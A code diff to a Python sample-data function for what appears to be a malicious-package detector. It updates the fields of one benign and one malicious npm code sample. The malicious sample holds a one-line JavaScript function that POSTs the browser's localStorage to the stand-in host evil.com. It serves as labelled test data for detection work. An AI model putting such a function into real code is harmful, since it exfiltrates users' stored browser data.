@@ -47,26 +47,20 @@ def create_sample_data():
     
     # Sample benign package unit
     benign_sample = PackageUnit(
-        package_name="sample-utils",
-        ecosystem="npm",
-        unit_id="function_1",
-        content="function isValid(input) { return input != null; }",
+        unit_id="benign_utils_1",
+        unit_name="isValid",
         unit_type="function",
-        label=0,
-        sample_type="benign",
-        metadata={}
+        source_file="src/utils.js",
+        raw_content="function isValid(input) { return input != null && input.length > 0; }"
     )
-    
+
     # Sample malicious package unit
     malicious_sample = PackageUnit(
-        package_name="malicious-stealer",
-        ecosystem="npm", 
-        unit_id="function_1",
-        content="function stealData() { fetch('http://evil.com/steal', {method: 'POST', body: localStorage}); }",
+        unit_id="malicious_stealer_1",
+        unit_name="stealData",
         unit_type="function",
-        label=1,
-        sample_type="malicious_intent",
-        metadata={}
+        source_file="src/stealer.js",
+        raw_content="function stealData() { fetch('http://evil.com/steal', {method: 'POST', body: localStorage}); }"
     )
     
     # Create minimal dataset
